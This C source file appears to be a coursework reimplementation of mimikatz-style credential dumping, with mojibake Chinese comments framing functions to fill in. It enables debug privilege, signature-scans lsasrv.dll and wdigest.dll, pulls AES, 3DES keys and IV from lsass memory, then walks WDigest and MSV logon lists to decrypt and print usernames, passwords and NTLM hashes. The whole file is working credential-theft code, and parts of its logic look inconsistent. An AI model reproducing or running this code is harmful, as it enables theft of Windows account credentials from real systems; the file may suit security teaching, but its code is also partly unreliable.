
#include "mimikatz.h"
#include <stdio.h>

extern BYTE g_sekurlsa_IV[AES_128_KEY_LENGTH];
extern BYTE g_sekurlsa_AESKey[AES_128_KEY_LENGTH];
extern BYTE g_sekurlsa_3DESKey[DES_3DES_KEY_LENGTH];
extern HANDLE g_hLsass;

/*****************************************************
 *  �뽫���º�����д��������ʵ�ֶ�Ӧ�Ĺ���              *
 *    - EnableSeDebugPrivilege                       *
 *****************************************************/
 /// �Ƽ�ʹ��API: OpenProcessToken() LookupPrivilegeValueW() AdjustTokenPrivileges()
BOOL EnableSeDebugPrivilege()
{
	HANDLE hToken = NULL;          // access token handle  
	LPCTSTR lpszPrivilege = SE_DEBUG_NAME;  // name of privilege to enable/disable  
	BOOL bEnablePrivilege = TRUE;   // to enable or disable privilege  

	TOKEN_PRIVILEGES tp;
	LUID luid;

	// Open the process token
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		printf("OpenProcessToken error: %u\n", GetLastError());
		return FALSE;
	}

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system  
		lpszPrivilege,   // privilege to lookup   
		&luid))          // receives LUID of privilege  
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.  
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		CloseHandle(hToken);
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("The token does not have the specified privilege. \n");
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}


/*****************************************************
 *  �뽫���µ�����������д��������ʵ�ֶ�Ӧ�Ĺ���         *
 *    - LocateUnprotectLsassMemoryKeys               *
 *	  - GetCredentialsFromMSV                        *
 *	  - GetCredentialsFromWdigest                    *
 *****************************************************/

 /// �� lsass.exe �ڴ��ж�ȡ��������ƾ�ݽ���AES���ܻ���3DES����ʹ�õ���Կ
 /// ������Ӧ��ȫ�ֱ��� g_sekurlsa_IV g_sekurlsa_AESKey g_sekurlsa_3DESKey
 /// �Ƽ�API: SearchPattern() ReadFromLsass()
VOID LocateUnprotectLsassMemoryKeys() {
	DWORD keySigOffset = 0;
	DWORD aesOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY hAesKey;
	KIWI_BCRYPT_KEY81 extractedAesKey;
	PVOID keyPointer = NULL;

	// ��lsass.exe�����ص�ģ��lsasrv.dll�����뵱ǰ���̵��ڴ�ռ���
	// �������صĻ���ַ lsasrvBaseAddress �� lsass.exe ������ lsasrv.dll ģ��Ļ���ַ����ͬ��
	// ��ͬһ��DLLģ���ڲ�ͬ�����лᱻ���ص�ͬһ��ַ�� ALSR �������Ӱ�����Ϊ��
	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");

	// lsasrv.dll ģ���е�ȫ�ֱ��� hAesKey ��һ��ָ��ʵ��AES��Կ�Ľṹ��ָ�룬��������λhAesKey��lsass.exe�����еĵ�ַ

	// ����Ӳ������ֽ�����ǩ����Windows 10��Windows 11�ϲ��Կ��ã���Win10��Win11����ʧЧ
	UCHAR keyAESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,
						0x44, 0x8b, 0x4d, 0xd8,
						0x48, 0x8d, 0x15 };

	// lsasrv.dll �� keyAESSig �ֽ���������Ӧ��ָ���࣬���� 99 2C 10 00 (С���� 0x102c99)
	// Ϊȫ�ֱ��� hAesKey ���ڵ�ַ�����һ��ָ���ַ0x1800752BF��ƫ��
	// �� hAesKey �ṹ�����ڵĵ�ַΪ 0x1800752BF + 0x102c99 = 0x180177F58
	// .text:00000001800752AB 83 64 24 30 00          and     [rsp+70h+var_40], 0
	// .text:00000001800752B0 48 8D 45 E0             lea     rax, [rbp + pbBuffer]
	// .text:00000001800752B4 44 8B 4D D8             mov     r9d, dword ptr[rbp + var_28]; cbKeyObject
	// .text:00000001800752B8 48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 
	// .text:00000001800752BF 48 8B 0D 9A 2C 10 00    mov     rcx, cs:?hAesProvider ; hAlgorithm
	//       ^^^^^^^^^^^^^^^^ ע���г��ֵľ��Ե�ַ 0x1800752BF ���� win11��lsasrv.dll Ϊ������ͬ

	// ��lsass���̵��ڴ���������λȫ�ֱ���hAesKey���ڴ�λ��
	// ��ȡ����ָ�� and [rsp+70h+var_40], 0 ���lsasrv.dllģ���ַ��ƫ��
	keySigOffset = SearchPattern(lsasrvBaseAddress, keyAESSig, sizeof keyAESSig);
	wprintf(L"keySigOffset = 0x%x\n", keySigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
	if (keySigOffset == 0) return;

	// ��lsass���̵��ڴ�λ��lsasrvBaseAddress + keySigOffset + sizeof keyAESSig �϶�ȡ4�ֽڵ�ƫ��
	//                     0x180000000       + 0x752AB      + 16              = 0x1800752bb
	// *(DWORD *)(0x1800752bb) = 0x102c99
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig, &aesOffset, sizeof aesOffset);
	wprintf(L"aesOffset = 0x%x\n", aesOffset);	// 0x102c99
	//			0x1800752bb�K
	//				48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 0x1800752B8�J         ^^ ^^ ^^ ^^


	// ��lsass���̵��ڴ�λ��lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset �϶�ȡ8�ֽڵ�����
	//                     0x180000000       + 0x752AB      + 16              + 4 + 0x102c99  = 0x180177f58
	//
	// .data:0000000180177F58 ?? ?? ?? ?? ?? ?? ?? ?? ?hAesKey@@3PEAXEA dq ?
	// ����ȡ��8�ֽڵ�������һ��ָ��ṹ�� KIWI_BCRYPT_HANDLE_KEY ��ָ��
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset, &keyPointer, sizeof keyPointer);
	wprintf(L"keyPointer = 0x%p\n", keyPointer); // ���� 0x000002318B910230
	//                       ^ �����ڴ���16�ֽڶ��룬�����4bit��Ϊ0

	// ��lsass���̵��ڴ�λ�� keyPointer ��ȡ���ṹ���ʵ������
	// ���� keyPointer δ֪����ʵ���������޷�ʹ��IDA Proͨ����̬�����õ�
	ReadFromLsass(keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// ��ȡ KIWI_BCRYPT_HANDLE_KEY �ṹ��������Ϊ PKIWI_BCRYPT_KEY81 �ĳ�Ա����ָ����ָ��� KIWI_BCRYPT_KEY81 �ṹ��
	// AES DES ��Կ��ʹ�� KIWI_BCRYPT_KEY81 �ṹ�����
	ReadFromLsass(hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY81));

	// KIWI_BCRYPT_KEY81 �� hardkey.data������Կ�ֽ����ݣ� hardkey.cbSecret������Կ�ĳ���
	memcpy(g_sekurlsa_AESKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);

	wprintf(L"AES Key Located (len %d): ", extractedAesKey.hardkey.cbSecret);
	HexdumpBytesPacked(extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);

	/// ... ���޸�

	/// ��lsass���̵��ڴ��ж�ȡ��3DES��Կg_sekurlsa_3DESKey
	DWORD desOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY h3DesKey;
	KIWI_BCRYPT_KEY81 extracted3DesKey;

	// .text:0000000180056970 83 64 24 30 00		  and [rsp + 70h + var_40], 0
	// .text:0000000180056975 48 8D 45 E0             lea     rax, [rbp + pbBuffer]
	// .text:0000000180056979 44 8B 4D D4             mov     r9d, dword ptr[rbp + pbOutput]; cbKeyObject
	// .text:000000018005697D 48 8D 15 34 0D 13 00    lea     rdx, ? h3DesKey@@3PEAXEA; phKey
	// .text:0000000180056984 48 8B 0D 3D 0D 13 00    mov     rcx, cs: ? h3DesProvider@@3PEAXEA; hAlgorithm
	
	UCHAR key3DESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,
						0x44, 0x8b, 0x4d, 0xd4,
						0x48, 0x8d, 0x15 };
	
	keySigOffset = SearchPattern(lsasrvBaseAddress, key3DESSig, sizeof key3DESSig);
	wprintf(L"keySigOffset = 0x%x\n", keySigOffset);	// 0x56970 (0000000180056970 & 0xFFFFF)
	if (keySigOffset == 0) return;

	// ��lsass���̵��ڴ�λ��lsasrvBaseAddress + keySigOffset + sizeof key3DESSig �϶�ȡ4�ֽڵ�ƫ��
	//                     0x180000000       + 0x56970      + 16              = 0x1800056980
	// *(DWORD *)(0x1800056980) = 0x130D34
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof key3DESSig, &desOffset, sizeof desOffset);
	wprintf(L"desOffset = 0x%x\n", desOffset);	// 0x130D34
	
	// ��lsass���̵��ڴ�λ��lsasrvBaseAddress + keySigOffset + sizeof key3DESSig + 4 + desOffset �϶�ȡ8�ֽڵ�����
	//                     0x180000000       + 0x56970      + 16              + 4 + 0x130D34  = 0x1800056A8C
	// .data:0000000180056A8C ?? ?? ?? ?? ?? ?? ?? ?? ?h3DesKey@@3PEAXEA dq ?
	// ����ȡ��8�ֽڵ�������һ��ָ��ṹ�� KIWI_BCRYPT_HANDLE_KEY ��ָ��
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof key3DESSig + 4 + desOffset, &keyPointer, sizeof keyPointer);
	wprintf(L"keyPointer = 0x%p\n", keyPointer); // ���� 0x000002318B910230
	
	// ��lsass���̵��ڴ�λ�� keyPointer ��ȡ���ṹ���ʵ������
	ReadFromLsass(keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// ��ȡ KIWI_BCRYPT_HANDLE_KEY �ṹ��������Ϊ PKIWI_BCRYPT_KEY81 �ĳ�Ա����ָ����ָ��� KIWI_BCRYPT_KEY81 �ṹ��
	// AES DES ��Կ��ʹ�� KIWI_BCRYPT_KEY81 �ṹ�����
	ReadFromLsass(h3DesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY81));

	// KIWI_BCRYPT_KEY81 �� hardkey.data������Կ�ֽ����ݣ� hardkey.cbSecret������Կ�ĳ���
	memcpy(g_sekurlsa_3DESKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);

	wprintf(L"3Des Key Located (len %d): ", extracted3DesKey.hardkey.cbSecret);
	HexdumpBytesPacked(extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);


	/// ��lsass���̵��ڴ��ж�ȡ��IV(InitializationVector): g_sekurlsa_IV
	DWORD ivOffset = 0;
	BYTE InitializationVector[16];

	// .text:0000000180056A10 78 4D                   js      short loc_180056A5F
	// .text:0000000180056A12 44 8D 4E F2             lea     r9d, [rsi - 0Eh]; dwFlags
	// .text:0000000180056A16 44 8B C6                mov     r8d, esi; cbBuffer
	// .text:0000000180056A19 48 8D 15 80 0C 13 00    lea     rdx, ? InitializationVector@@3PAEA; pbBuffer
	// .text:0000000180056A20 33 C9					  xor ecx, ecx; hAlgorithm

	UCHAR keyIVSig[] = { 0x78, 0x4D,
						0x44, 0x8D, 0x4E, 0xF2,
						0x44, 0x8B, 0xC6,
						0x48, 0x8D, 0x15 };

	// ����IV������
	DWORD ivSigOffset = SearchPattern(lsasrvBaseAddress, keyIVSig, sizeof keyIVSig);
	if (ivSigOffset == 0) return;

	// ��ȡ4�ֽ�ƫ��
	ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);

	// ����IVȫ�ֱ�����ַ
	PUCHAR ivAddress = lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig + 4 + ivOffset;

	// ֱ�Ӷ�ȡ16�ֽ�IV����
	ReadFromLsass(ivAddress, g_sekurlsa_IV, sizeof(g_sekurlsa_IV));
	wprintf(L"IV Located: ");
	HexdumpBytesPacked(g_sekurlsa_IV, sizeof(g_sekurlsa_IV));
}


/// ����Wdigest�������ڴ��е���������
VOID GetCredentialsFromWdigest() {
	KIWI_WDIGEST_LIST_ENTRY entry;
	DWORD logSessListSigOffset, logSessListOffset;
	PKIWI_WDIGEST_LIST_ENTRY logSessListAddr = NULL, pList;
	WCHAR passDecrypted[1024];

	PUCHAR wdigestBaseAddress = (PUCHAR)LoadLibraryA("wdigest.dll");

	/// ... ���޸�

	// .text:000000018001A467 48 FF 15 52 55 01 00    call    cs : __imp_RtlEnterCriticalSection
	// .text:000000018001A46E 0F 1F 44 00 00          nop     dword ptr[rax + rax + 00h]
	// .text:000000018001A473 48 8B 1D C6 B9 01 00    mov     rbx, cs: ? l_LogSessList@@3U_LIST_ENTRY@@A; _LIST_ENTRY l_LogSessList
	// .text:000000018001A47A 48 8D 0D BF B9 01 00    lea     rcx, ? l_LogSessList@@3U_LIST_ENTRY@@A; _LIST_ENTRY l_LogSessList
	// .text:000000018001A481 48 3B D9                cmp     rbx, rcx

	UCHAR keySig[] = { 0x48, 0xFF, 0x15, 0x52, 0x55, 0x01, 0x00,
						0x0F, 0x1F, 0x44, 0x00, 0x00,
						0x48, 0x8B, 0x1D, 0xC6, 0xB9, 0x01, 0x00,
						0x48, 0x8D, 0x0D };

	// ����Wdigest������
	logSessListSigOffset = SearchPattern(wdigestBaseAddress, keySig, sizeof keySig);
	if (logSessListSigOffset == 0) return;

	// ��ȡ4�ֽ�ƫ��
	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof keySig, &logSessListOffset, sizeof logSessListOffset);
	wprintf(L"logSessListOffset = 0x%x\n", logSessListOffset);

	// ����logSessListAddrȫ�ֱ�����ַ
	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof keySig + 4 + logSessListOffset, &logSessListAddr, sizeof logSessListAddr);
	wprintf(L"logSessListAddr = 0x%p\n", logSessListAddr);

	// ��ȡlogSessListAddrָ��Ľṹ������
	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));
	pList = entry.This;

	do {
		memset(&entry, 0, sizeof(entry));
		ReadFromLsass(pList, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

		if (entry.UsageCount == 1) {
			UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
				(PUCHAR)pList + offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName)
				));
			UNICODE_STRING* password = ExtractUnicodeString((PUNICODE_STRING)(
				(PUCHAR)pList + offsetof(KIWI_WDIGEST_LIST_ENTRY, Password)
				));

			if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
			else wprintf(L"Username: [NULL]\n");

			// Check if password is present
			if (password->Length != 0 && (password->Length % 2) == 0) {
				// Decrypt password using recovered AES/3Des keys and IV
				if (DecryptCredentials((char*)password->Buffer, password->MaximumLength,
					(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
					wprintf(L"Password: %ls\n\n", passDecrypted);
				}
			}
			else {
				printf("Password: [NULL]\n\n");
			}

		}
		pList = entry.Flink;
	} while (pList != logSessListAddr);
	return;
}


/// �Ƽ�ʹ��API: 
///		LoadLibraryA() 
///		SearchPattern() 
///		ReadFromLsass() 
///		DecryptCredentials() 
///		ExtractUnicodeString()
/// �Ƽ�ʹ�ýṹ��: 
///		KIWI_MSV1_0_LIST_63
///		KIWI_MSV1_0_CREDENTIALS 
///		KIWI_MSV1_0_PRIMARY_CREDENTIALS
VOID GetCredentialsFromMSV() {
	DWORD keySigOffset = 0;
	KIWI_MSV1_0_LIST_63 entry;
	DWORD logSessListSigOffset, LogonSessionListOffset;
	PKIWI_MSV1_0_LIST_63 logSessListAddr = NULL;	// List Header

	/// ... ���޸�

	// .text:00000001800BF83A 48 FF 15 27 3C 08 00    call    cs:__imp_RtlAcquireResourceShared
	// .text:00000001800BF841 0F 1F 44 00 00          nop     dword ptr[rax + rax + 00h]
	// .text:00000001800BF846 48 C1 E3 04             shl     rbx, 4
	// .text:00000001800BF84A 4D 8D B7 C0 62 18 00    lea     r14, rva ? LogonSessionList@@3PAU_LIST_ENTRY@@A[r15]; _LIST_ENTRY near* LogonSessionList
	// .text:00000001800BF851 4C 03 F3                add     r14, rbx

	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");

	UCHAR keySig[] = {	0x48, 0xFF, 0x15, 0x27, 0x3C, 0x08, 0x00,
						0x0F, 0x1F, 0x44, 0x00, 0x00,
						0x48, 0xC1, 0xE3, 0x04,
						0x4D, 0x8D, 0xB7 };

	keySigOffset = SearchPattern(lsasrvBaseAddress, keySig, sizeof keySig);
	if (keySigOffset == 0) return;
	wprintf(L"keySigOffset = 0x%x\n", keySigOffset);

	// ��ȡLogonSessionList��RVA
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof(keySig), &LogonSessionListOffset, sizeof(LogonSessionListOffset));
	wprintf(L"LogonSessionListOffset = 0x%x\n", LogonSessionListOffset);

	// ����ȫ�ֱ���LogonSessionList�ĵ�ַ
	logSessListAddr = (PKIWI_MSV1_0_LIST_63)(lsasrvBaseAddress + LogonSessionListOffset);
	wprintf(L"logSessListAddr = 0x%p\n", logSessListAddr);

	PKIWI_MSV1_0_LIST_63 pList = logSessListAddr;

	do {
		KIWI_MSV1_0_LIST_63 listEntry;
		KIWI_MSV1_0_CREDENTIALS credentials;

		// ���������
		// wprintf(L"Username: %ls\n", );
		// wprintf(L"NTLMHash: %ls\n\n", );

		memset(&listEntry, 0, sizeof(listEntry));
		ReadFromLsass(pList, &listEntry, sizeof(KIWI_MSV1_0_LIST_63));

		bool readOk = ReadFromLsass(pList, &listEntry, sizeof(KIWI_MSV1_0_LIST_63));

		// ��ȡƾ������ͷ
		PKIWI_MSV1_0_CREDENTIALS credPtr = listEntry.Credentials;
		//wprintf(L"Credentials List Address: 0x%p\n", credPtr);

		while (credPtr) {
			KIWI_MSV1_0_CREDENTIALS credentials;
			memset(&credentials, 0, sizeof(credentials));
			ReadFromLsass(credPtr, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS));

			if (credentials.PrimaryCredentials) {
				PKIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredPtr = (PKIWI_MSV1_0_PRIMARY_CREDENTIALS)credentials.PrimaryCredentials;
				KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCred;
				ReadFromLsass(primaryCredPtr, &primaryCred, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));

				// ��ȡ���ܵ�ƾ�ݻ�����
				LSA_UNICODE_STRING* credStr = &primaryCred.Credentials;

				if (credStr->Length && credStr->Buffer) {
					WCHAR passDecrypted[1024];

					LSA_UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
						(PUCHAR)pList + offsetof(KIWI_MSV1_0_LIST_63, UserName)
						));

					if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
					else wprintf(L"Username: [NULL]\n");

					// ����decryptedCreds����䣬�ҳ����㹻
					typedef struct _MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER {
						LSA_UNICODE_STRING LogonDomainName;
						LSA_UNICODE_STRING UserName;
						LSA_UNICODE_STRING Domaine;
						LSA_UNICODE_STRING NtOwfPassword;
						// ... �����ֶ�
					} MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, * PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER;

					BYTE encryptedCreds[8192] = { 0 };
					ReadFromLsass(credStr->Buffer, encryptedCreds, credStr->Length);
					BYTE decryptedCreds[8192] = { 0 };
					DecryptCredentials((char*)encryptedCreds, credStr->Length, decryptedCreds, sizeof(decryptedCreds));
					HexdumpBytesPacked((PUCHAR)decryptedCreds, 64);
					PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER)decryptedCreds;

					LSA_UNICODE_STRING* UserName = ExtractUnicodeString((PUNICODE_STRING)(
						(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, UserName)
						));
					if (UserName->Length != 0 && UserName->Buffer) {
						wprintf(L"UserName->Length: %d\n", UserName->Length);
						wprintf(L"Username: %ls\n", UserName->Buffer);
					}
					else {
						wprintf(L"Username: [NULL]\n");
					}

					LSA_UNICODE_STRING* NtOwfPassword = ExtractUnicodeString((PUNICODE_STRING)(
						(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, NtOwfPassword)
						));

					if (NtOwfPassword->Length != 0 && NtOwfPassword->Buffer) {
						// Decrypt password using recovered AES/3Des keys and IV
						if (DecryptCredentials((char*)NtOwfPassword->Buffer, NtOwfPassword->MaximumLength,
							(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
							wprintf(L"Password: %ls\n\n", passDecrypted);
						}
					}
					else {
						wprintf(L"NTLMHash: [NULL]\n\n");
					}

				}
			}
			credPtr = credentials.next;
		}
		pList = listEntry.Flink;
	} while (pList != logSessListAddr);
}